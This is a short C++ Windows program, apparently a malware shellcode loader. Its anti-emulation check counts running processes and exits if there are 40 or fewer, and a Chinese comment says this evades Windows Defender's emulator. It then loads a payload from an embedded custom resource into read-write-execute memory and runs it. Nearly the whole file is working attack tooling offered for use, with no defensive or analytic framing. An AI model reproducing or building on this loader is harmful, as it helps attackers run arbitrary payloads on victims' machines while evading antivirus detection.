#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

void AntiSimulation()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        return;
    }
    PROCESSENTRY32 pe = { sizeof(pe) };
    int procnum = 0;
    for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe))
    {
        procnum++;
    }
    if (procnum <= 40) //判断当前进程是否低于40个, 目前见过能模拟最多进程的是WD能模拟39个
    {
        exit(1);
    }
}

#include "resource.h"

int main()
{
    AntiSimulation();
    //HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDB_BITMAP1), RT_BITMAP);
    HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELL1), L"shell"); // 自定义的才使用 L"TYPE"
    DWORD error_code = GetLastError();
    std::cout << error_code << std::endl;

    DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
    HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

    //void* exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    void* exec = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcodeResourceData, shellcodeSize);
    ((void(*)())exec)();

    return 0;
}